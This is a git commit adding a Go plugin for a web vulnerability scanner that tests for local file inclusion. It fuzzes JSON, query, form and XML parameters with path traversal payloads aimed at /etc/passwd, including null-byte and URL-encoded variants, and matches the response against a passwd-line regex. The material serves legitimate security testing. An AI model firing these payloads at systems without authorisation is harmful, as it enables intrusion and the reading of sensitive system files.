7b346af4d3197d4b603582827b5f9b8da7f7d1ab
Henrique Scocco <henrique.scocco@gmail.com>
2023-05-05 11:18:48 -0300

    add LFI template

---
+++ templates/lfi/lfi.go
@@ -0,0 +1,60 @@
+package main
+
+import (
+    "net/http"
+    "github.com/cfsdes/nucke/pkg/report"
+    //"github.com/cfsdes/nucke/pkg/plugins/utils"
+    "github.com/cfsdes/nucke/pkg/plugins/fuzzers"
+    "github.com/cfsdes/nucke/pkg/plugins/detections"
+)
+
+
+func Run(r *http.Request, client *http.Client, pluginDir string) (string, string, string, bool, error) {
+    // Scan
+    vulnFound, rawReq, url := scan(r, client, pluginDir)
+
+    // Report
+    reportContent := report.ReadFileToString("report-template.md", pluginDir)
+    summary := report.ParseTemplate(reportContent, map[string]interface{}{
+        "request": rawReq,
+    })
+    
+    return	"High", url, summary, vulnFound, nil
+}
+
+
+// Running all Fuzzers
+func scan(r *http.Request, client *http.Client, pluginDir string) (bool, string, string) {
+    
+    // Read rules file
+    rules := []string{"root:.*:0:0:"}
+    payloads := []string{
+        "/etc/passwd",
+        "./../../../../../../../../../../etc/passwd",
+        "./../../../../../../../../../../etc/passwd\x00",
+        ".%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "./.\x00./.\x00./.\x00./.\x00./.\x00./.\x00./.\x00./.\x00./.\x00./.\x00./etc/passwd",
+    }
+
+    matcher := detections.Matcher{
+        Body: &detections.BodyMatcher{
+            RegexList: rules,
+        },
+    }
+
+    // Call All Fuzzers (Except fuzzHeaders)
+    fuzzers := []func(*http.Request, *http.Client, []string, detections.Matcher) (bool, string, string, string, string){
+        fuzzers.FuzzJSON,
+        fuzzers.FuzzQuery,
+        fuzzers.FuzzFormData,
+        fuzzers.FuzzXML,
+    }
+
+    for _, fuzzer := range fuzzers {
+        if vulnFound, rawReq, url, _, _ := fuzzer(r, client, payloads, matcher); vulnFound {
+            return vulnFound, rawReq, url
+        }
+    }
+
+    return false, "", ""
+}
